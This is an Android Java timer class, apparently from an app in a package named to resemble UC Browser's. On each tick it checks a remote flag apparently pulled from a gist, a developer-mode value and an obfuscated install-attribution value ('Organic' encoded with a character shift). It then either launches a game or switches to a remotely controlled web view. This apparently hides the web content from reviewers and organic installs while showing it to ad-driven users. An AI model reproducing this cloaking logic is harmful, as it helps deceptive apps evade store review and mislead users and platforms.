package com.UCMobile.in.web;

import android.os.CountDownTimer;
import android.util.Log;

import static com.UCMobile.in.web.MethodsWeb.codSTomb;
import static com.UCMobile.in.web.MethodsWeb.startGameTomb;
import static com.UCMobile.in.web.MethodsWeb.startWebAndTomb;
import static com.UCMobile.in.web.VarAndObj.*;

public class Timer extends CountDownTimer {


    public Timer(long millisInFuture, long countDownInterval) {
        super(millisInFuture, countDownInterval);
        super.start();
    }

    @Override
    public void onTick(long l) {
        if(DATA_FROM_GIST_TOMB != null && !ST_APPS_TOMB.equals("")){
            if (DATA_FROM_GIST_TOMB[0].equals("true")) {
                if (DEV_TOMB == 0) {
                    Log.i("MyLog", "Status = True, Dev = 0, FB/NAming = false/true");
                    startWebAndTomb();
                    super.cancel();
                } else {
                    if (!ST_APPS_TOMB.equals(codSTomb("Qticpke", 2)) || !MAPS_APPS_TOMB[3].equals("")) {
                        Log.i("MyLog", "Status = True, Dev = 1, FB/NAming = true");
                        startWebAndTomb();
                        super.cancel();
                    } else {
                        Log.i("MyLog", "Status = True, Dev = 1, FB/NAming = false");
                        startGameTomb();
                        super.cancel();
                    }
                }

            } else {
                if (!ST_APPS_TOMB.equals("") && !MAPS_APPS_TOMB[3].equals("")) {
                    Log.i("MyLog", "Status = false, Dev = non, FB/NAming = true");
                    startWebAndTomb();
                    super.cancel();
                }
            }
        }
    }

    @Override
    public void onFinish() {
        startGameTomb();
    }
}
